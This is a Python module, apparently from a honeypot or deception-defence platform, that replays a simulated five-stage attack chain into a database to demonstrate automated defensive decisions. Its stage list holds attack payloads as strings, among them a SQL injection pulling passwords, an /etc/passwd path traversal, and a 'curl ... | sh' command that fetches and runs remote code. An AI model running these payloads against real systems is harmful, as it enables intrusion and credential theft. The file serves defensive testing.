import time
import random
from typing import Dict, Any, List
from sqlalchemy.orm import Session
from backend.models.session import AttackerSession
from backend.models.attack import AttackLog
from backend.core.decision_engine import AutonomousDecisionEngine
from backend.core.deception_diagnostics import DeceptionDiagnosticsEngine

class GuidedDeceptionDemo:
    """
    Automated attack scenario replayer demonstrating PRAETOR's autonomous
    deception decision loops, ML classifications, and CMARL response optimizations.
    """
    def __init__(self, db: Session):
        self.db = db

    def execute_guided_scenario(self) -> Dict[str, Any]:
        """
        Executes a 5-stage attack chain and logs the resulting defensive telemetry.
        """
        session_id = f"demo_sess_{random.randint(100000, 999999)}"
        ip_address = f"198.51.100.{random.randint(2, 254)}"
        
        # Initialize Attacker Session
        session = AttackerSession(
            session_id=session_id,
            ip_address=ip_address,
            is_active=True,
            rl_state="start",
            rl_action="default:low"
        )
        self.db.add(session)
        self.db.commit()
        
        stages = [
            {"attack": "port_scan", "payload": "SYN Port Scan sweep", "risk": 45.0},
            {"attack": "brute_force", "payload": "SSH dictionary attack admin/admin", "risk": 75.0},
            {"attack": "sql_injection", "payload": "UNION SELECT username, password FROM users", "risk": 90.0},
            {"attack": "path_traversal", "payload": "GET /../../etc/passwd HTTP/1.1", "risk": 80.0},
            {"attack": "command_injection", "payload": "curl http://malicious.bin | sh", "risk": 95.0}
        ]
        
        decision_engine = AutonomousDecisionEngine(self.db)
        diagnostics = DeceptionDiagnosticsEngine(self.db)
        
        execution_trace = []
        intel_points = 0
        
        for idx, stage in enumerate(stages):
            # Ingest simulated telemetry
            decision = decision_engine.evaluate_decision_state(
                ip_address=ip_address,
                current_session_id=session_id,
                attack_type=stage["attack"],
                confidence=0.95
            )
            
            log = AttackLog(
                session_id=session_id,
                ip_address=ip_address,
                attack_type=stage["attack"],
                payload=stage["payload"],
                confidence=0.95,
                risk_score=stage["risk"],
                deception_action=decision["recommended_strategy"]
            )
            self.db.add(log)
            intel_points += 5
            
            execution_trace.append({
                "stage_index": idx + 1,
                "attack": stage["attack"],
                "mapped_mitre_technique": decision["predicted_next_ttp"],
                "deception_recommendation": decision["recommended_strategy"],
                "reasoning_trace": decision["reasoning_trace"]
            })
            
        # Finalize and calculate diagnostic scores
        session.is_active = False
        session.session_duration = 45.2
        session.interaction_depth = len(stages)
        session.rl_deception_score = 1.0
        self.db.commit()
        
        des_metrics = diagnostics.calculate_deception_effectiveness(session_id)
        rod_metrics = diagnostics.calculate_return_on_deception(session_id)
        
        return {
            "status": "success",
            "session_id": session_id,
            "ip_address": ip_address,
            "incident_stages_processed": len(stages),
            "attacker_dwell_time_seconds": 45.2,
            "deception_effectiveness": des_metrics,
            "return_on_deception": rod_metrics,
            "stages_trace": execution_trace
        }
